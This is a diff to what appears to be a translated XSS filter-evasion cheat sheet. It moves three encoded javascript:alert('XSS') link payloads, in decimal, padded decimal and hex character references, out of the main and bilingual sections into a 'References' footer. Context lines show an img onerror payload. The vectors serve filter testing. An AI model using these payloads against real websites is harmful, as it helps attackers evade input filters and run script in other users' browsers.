@@ -124,31 +124,6 @@ This attack will bypass most SRC domain filters. Inserting JavaScript in an even
 <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
 ```
 
-### Decimal HTML Character References
-
-Since XSS examples that use a `javascript:` directive inside an `&lt;IMG` tag do not work on Firefox this approach uses decimal HTML character references as a workaround:
-
-```html
-
- <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
-```
-
-### Decimal HTML Character References Without Trailing Semicolons
-
-This is often effective in bypassing XSS filters that look for the string `&\\#XX;`, since most people don't know about padding - which can be used up to 7 numeric characters total. This is also useful against filters that decode against strings like `$tmp\\_string =\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;` which incorrectly assumes a semicolon is required to terminate a HTML encoded string (This has been seen in the wild):
-
-```html
-<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
-```
-
-### Hexadecimal HTML Character References Without Trailing Semicolons
-
-This attack is also viable against the filter for the string `$tmp\\_string=\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;`, because it assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters:
-
-```html
-<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
-```
-
 ### Embedded Tab
 
 This approach breaks up the XSS attack:
@@ -1494,73 +1469,6 @@ This attack will bypass most SRC domain filters. Inserting JavaScript in an even
 
 ```html
 <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
-```
-
-</div>
-
-<div className="bilingualPair">
-<div className="bilingualBlock english">
-<span className="bilingualLabel english">English (原文)</span>
-
-### Decimal HTML Character References
-
-Since XSS examples that use a `javascript:` directive inside an `&lt;IMG` tag do not work on Firefox this approach uses decimal HTML character references as a workaround:
-
-</div>
-
-</div>
-
-<div className="bilingualCommon">
-<span className="bilingualLabel common">コード・画像 (共通)</span>
-
-
-```html
-
- <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
-```
-
-</div>
-
-<div className="bilingualPair">
-<div className="bilingualBlock english">
-<span className="bilingualLabel english">English (原文)</span>
-
-### Decimal HTML Character References Without Trailing Semicolons
-
-This is often effective in bypassing XSS filters that look for the string `&\\#XX;`, since most people don't know about padding - which can be used up to 7 numeric characters total. This is also useful against filters that decode against strings like `$tmp\\_string =\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;` which incorrectly assumes a semicolon is required to terminate a HTML encoded string (This has been seen in the wild):
-
-</div>
-
-</div>
-
-<div className="bilingualCommon">
-<span className="bilingualLabel common">コード・画像 (共通)</span>
-
-
-```html
-<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
-```
-
-</div>
-
-<div className="bilingualPair">
-<div className="bilingualBlock english">
-<span className="bilingualLabel english">English (原文)</span>
-
-### Hexadecimal HTML Character References Without Trailing Semicolons
-
-This attack is also viable against the filter for the string `$tmp\\_string=\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;`, because it assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters:
-
-</div>
-
-</div>
-
-<div className="bilingualCommon">
-<span className="bilingualLabel common">コード・画像 (共通)</span>
-
-
-```html
-<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
 ```
 
 </div>
@@ -5772,6 +5680,30 @@ On Mouse Over​:
 </section>
 </div>
 
+## References
+
+<div className="referenceFooter">
+
+Since XSS examples that use a `javascript:` directive inside an `&lt;IMG` tag do not work on Firefox this approach uses decimal HTML character references as a workaround:
+
+```html
+
+ <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
+```
+
+This is often effective in bypassing XSS filters that look for the string `&\\#XX;`, since most people don't know about padding - which can be used up to 7 numeric characters total. This is also useful against filters that decode against strings like `$tmp\\_string =\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;` which incorrectly assumes a semicolon is required to terminate a HTML encoded string (This has been seen in the wild):
+
+```html
+<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
+```
+
+This attack is also viable against the filter for the string `$tmp\\_string=\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;`, because it assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters:
+
+```html
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
+```
+
+</div>
 
 
 ## Attribution
